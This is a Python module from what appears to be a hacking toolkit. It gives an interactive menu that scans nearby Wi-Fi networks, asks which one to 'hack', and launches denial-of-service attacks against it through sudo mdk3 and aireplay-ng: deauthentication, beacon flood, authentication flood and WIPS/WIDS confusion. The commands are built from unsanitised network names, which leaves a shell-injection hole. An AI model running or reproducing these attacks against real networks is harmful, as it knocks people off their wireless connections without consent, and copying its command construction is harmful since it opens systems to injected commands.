import os, sys
import subprocess, csv
try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO
from simplejson import dumps
from time import sleep, time
from ..tools.util import clear, bcolors, RepresentsInt
from ..model.target import Target


userInterface = ''
userTarget = ''
def attacker(interface, gateway, interArr, monitor, target):
    if 'mon' in interface:
        monitor = True

    # print(str(userTarget["essid"]))

    if (userTarget != ''):
        target = userTarget

    modeStr = ''
    if(monitor == True):

        modeStr = 'Monitor'
    else:
        modeStr = 'Managed'
    listAttacks(interface, modeStr, target)
    # Take user input as int
    choice = input("\n" + bcolors.BOLD +
                   "Please choose an attack\n> " + bcolors.ENDC)
    if (RepresentsInt(choice)):
        # Convert in int
        choice = int(choice)

        # uun list
        if choice == 1:
            clear()
            # Run mdk3 Deauther
            print(bcolors.OKGREEN + "Starting attack!" + bcolors.ENDC)
            print(bcolors.OKBLUE + "(C-c) to stop" + bcolors.ENDC)
            os.system('sudo mdk3 ' + interface.replace('\n', '') +' d - v -c')
            sys.stdout.write('\b\b\r')  # Current solution
            sys.stdout.flush()

            # Clean up
            clear()

            attacker(interface, gateway, interArr, monitor, target)
        elif choice == 2:

            clear()
            command ='sudo mdk3 ' + interface.replace('\n', '') +' b -n ' + target.essid + ' -h'
            # run mitm
            gh = input(bcolors.BOLD + "\nWould you like to use a 5ghz\ny/n " + bcolors.ENDC)
            wpa = input(bcolors.BOLD + "\nWould you like to use WPA AES\ny/n " + bcolors.ENDC)

            if gh == 'y' or gh =='yes':
                command += ' -g'
            if wpa == 'y' or wpa =='yes':
                command += ' -a'
            else:
                wep = input(bcolors.BOLD + "\nWould you like to use WEP\ny/n " + bcolors.ENDC)
                if wep == 'y' or wep == 'yes':
                    command += ' -w'



            print(bcolors.OKGREEN + "Starting attack!" + bcolors.ENDC)
            print(bcolors.OKBLUE + "(C-c) to stop" + bcolors.ENDC)
            os.system(command)
            sys.stdout.write('\b\b\r')  # Current solution
            sys.stdout.flush()

            # Clean up
            clear()

            # Recursion
            attacker(interface, gateway, interArr, monitor, target)
        elif choice == 3:
            clear()

            print(bcolors.OKGREEN + "Starting attack!" + bcolors.ENDC)
            print(bcolors.OKBLUE + "(C-c) to stop" + bcolors.ENDC)
            os.system('sudo mdk3 ' + interface.replace('\n', '') +' a')
            sys.stdout.write('\b\b\r')  # Current solution
            sys.stdout.flush()

            # Clean up
            clear()

            attacker(interface, gateway, interArr, monitor, target)
        elif choice == 4:
            clear()

            print(bcolors.OKGREEN + "Starting attack!" + bcolors.ENDC)
            print(bcolors.OKBLUE + "(C-c) to stop" + bcolors.ENDC)
            os.system('sudo mdk3 ' + interface.replace('\n', '') +' w -z -c ' + ' -e ' + target.bssid)
            sys.stdout.write('\b\b\r')  # Current solution
            sys.stdout.flush()

            # Clean up
            clear()

            attacker(interface, gateway, interArr, monitor, target)
        elif choice == 5:
            clear()
            # Run Airmon attack
            print(bcolors.OKGREEN + "Starting attack!" + bcolors.ENDC)
            print(bcolors.OKBLUE + "(C-c) to stop" + bcolors.ENDC)
            os.system('sudo aireplay-ng ' + interface.replace('\n', '') + ' --deauth 0 -a ' + target.bssid + ' -e ' + target.essid)
            sys.stdout.write('\b\b\r')  # Current solution
            sys.stdout.flush()

            # Clean up
            clear()

            attacker(interface, gateway, interArr, monitor, target)
        elif choice == 6:
            clear()
        else:
            clear()
            print(bcolors.FAIL + "Please input a valid option." + bcolors.ENDC)
            attacker(interface, gateway, interArr, monitor, target)

    else:
        clear()
        print(bcolors.FAIL + "Please input a valid option." + bcolors.ENDC)

        # Recusive loop
        attacker(interface, gateway, interArr, monitor, target)




def listAttacks(interface, monitor, target):
    print(str(bcolors.HEADER + "Wifi Modules: " + bcolors.ENDC))
    print(str(bcolors.BOLD + "Interface: " + interface.replace('\n', '') + bcolors.ENDC))
    print(str(bcolors.BOLD + "Mode: " + monitor.replace('\n', '') + bcolors.ENDC))
    if (target != ''):
        print(str(bcolors.BOLD + "Target:" + target.essid + bcolors.ENDC))
    print("1) Mdk3 Deauth Attack")
    print("2) Mdk3 Beacon Flood")
    print("3) Mdk3 Auth Flood")
    print("4) WIPS / WIDS Confusion attack")
    print("5) Airmon-ng Deauth Attack")
    print("6) Go back")






def scan(interface):
    if 'mon' in interface:
        print(bcolors.OKGREEN + "Starting scan!" + bcolors.ENDC)
        print(bcolors.OKBLUE + "(C-c) when you see your target" + bcolors.ENDC)
        sleep(2)
        # Run scan
        os.system('sudo airodump-ng --output-format csv --write /tmp/capture ' + interface)
        sys.stdout.write('\b\b\r')  # Current solution
        sys.stdout.flush()

        # Clean up
        clear()


        # Get Data
        networks = (fetch_data())
        # print(str(fetch_data()))

        # List networks
        counter = 1
        print(bcolors.HEADER + 'Nearby Networks' + bcolors.ENDC)
        for net in networks:
            if counter > 1:
                print(str(counter - 1) + '. ' + net.to_str())
            counter += 1

        # Target network
        ui = input(bcolors.BOLD + "\nWhich network would you like to hack?\n> " + bcolors.ENDC)
        if RepresentsInt(ui):
            ui = int(ui)

        # Setup target
        clear()
        # userTarget = networks[ui]
        return networks[ui]
    else:
        print(bcolors.FAIL + 'Please put card in monitor mode first.' + bcolors.ENDC)
        return ''
    # conv = lambda row: {'bssid':row[0], 'channel':row[3], 'cipher':row[6], 'power':row[8], 'essid':row[12]}


def conv(row):
    # return {'BSSID':row[0], 'channel':row[3], 'cipher':row[6], 'power':row[8], 'essid':row[13]}
    return Target(row)

def fetch_data():
    """
    get the newest capture.csv file, then use awk to get only Station data
    """
    data = open("/tmp/" + os.popen("ls -Art /tmp | grep capture | tail -n 1").read().replace('\n', ''), newline='')
    # data = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    # f = StringIO(str(data))
    f = data
    # convert the data to a list of dict() objects
    items = list(csv.reader(f, delimiter=','))
    del(items[0])
    data = [row for row in items if len(row) == 15 and row[8] != 'Power']

    return [conv(row) for row in data]


def normalMode(interface):
    """
    Return interface to normal mode
    """
    # os.system('sudo airmon-ng stop ' + interface + 'mon')
    # os.system()
    print(bcolors.OKBLUE + "Setting managed mode on " + interface + bcolors.ENDC)
    if 'mon' in interface:
        output = subprocess.check_output("sudo airmon-ng stop " + interface, shell=True)
        clear()
        print(bcolors.OKBLUE + "Mode changed!" + bcolors.ENDC)
    return False


def monitorMode(interface):
    """
    Transfer interface to normalMode mode
    """
    # os.system('sudo airmon-ng start ' + interface)
    print(bcolors.OKBLUE + "Setting monitor mode on " + interface + bcolors.ENDC)
    if 'mon' not in interface:
        output = subprocess.check_output("sudo airmon-ng start " + interface, shell=True)
        clear()
        print(bcolors.OKBLUE + "Mode changed!" + bcolors.ENDC)
    return True


def startWifi():
    out = os.popen('ship -g').read().split(' ')
    gateway = out[1].replace('\n', '')
    interface = os.popen('ship -i').read()
    target = ''

    if (userInterface):
        interface = userInterface

    # Array of interfaces
    interArr = os.popen('ship -A').read().split(' ')

    if 'Local' in interface:
        interface = interArr[1]


    run(interface, gateway, interArr, normalMode, target)


def run(interface, gateway, interArr, monitor, target):
    if 'mon' in interface:
        monitor = True

    # print(str(userTarget["essid"]))


    modeStr = ''
    if(monitor == True):

        modeStr = 'Monitor'
    else:
        modeStr = 'Managed'
    printModule(interface, modeStr, target)
    # Take user input as int
    choice = input("\n" + bcolors.BOLD +
                   "Please choose an option\n> " + bcolors.ENDC)

    if (RepresentsInt(choice)):
        # Convert in int
        choice = int(choice)

        # Run list
        if choice == 1:
            clear()
            # print(bcolors.FAIL + "WIP" + bcolors.ENDC)
            target = scan(interface)
            run(interface, gateway, interArr, monitor, target)
        elif choice == 2:

            clear()
            # run mitm
            attacker(interface, gateway, interArr, monitor, target)

            # Recursion
            run(interface, gateway, interArr, monitor, target)
        elif choice == 3:
            clear()

            # Run RAT Listener
            monitor = monitorMode(interface)
            interface = os.popen('ship -A').read().split(' ')[1]

            run(interface, gateway, interArr, monitor, target)
        elif choice == 4:
            clear()

            monitor = normalMode(interface)
            interface = os.popen('ship -A').read().split(' ')[1]

            # Recursion
            run(interface, gateway, interArr, monitor, target)
        elif choice == 5:

            clear()

            print(bcolors.HEADER + "Interfaces: " + bcolors.ENDC)
            for interface in interArr:
                print(interface)
            interface = input("\n" + bcolors.BOLD + "Please enter a new interface\n> " + bcolors.ENDC)

            clear()
            # Recursion
            run(interface, gateway, interArr, monitor, target)

        elif choice == 6:
            clear()
            print(bcolors.HEADER + "Interfaces: " + bcolors.ENDC)
            for interface in interArr:
                print(interface)

            run(interface, gateway, interArr, monitor, target)

        elif choice == 7:
            clear()
        else:
            clear()
            print(bcolors.FAIL + "Please input a valid option." + bcolors.ENDC)
            run(interface, gateway, interArr, monitor, target)

    else:
        clear()
        print(bcolors.FAIL + "Please input a valid option." + bcolors.ENDC)

        # Recusive loop
        run(interface, gateway, interArr, monitor, target)

def printModule(interface, monitor, target):
    print(str(bcolors.HEADER + "Wifi Modules: " + bcolors.ENDC))
    print(str(bcolors.BOLD + "Interface: " + interface.replace('\n', '') + bcolors.ENDC))
    print(str(bcolors.BOLD + "Mode: " + monitor.replace('\n', '') + bcolors.ENDC))
    if (target != ''):
        print(str(bcolors.BOLD + "Target:" + target.essid + bcolors.ENDC))
    print("1) Scan networks")
    print("2) DOS Attacks")
    print("3) Put interface in monitor mode")
    print("4) Put interface in managed mode")
    print("5) Change interface")
    print("6) List interfaces")
    print("7) Go back")
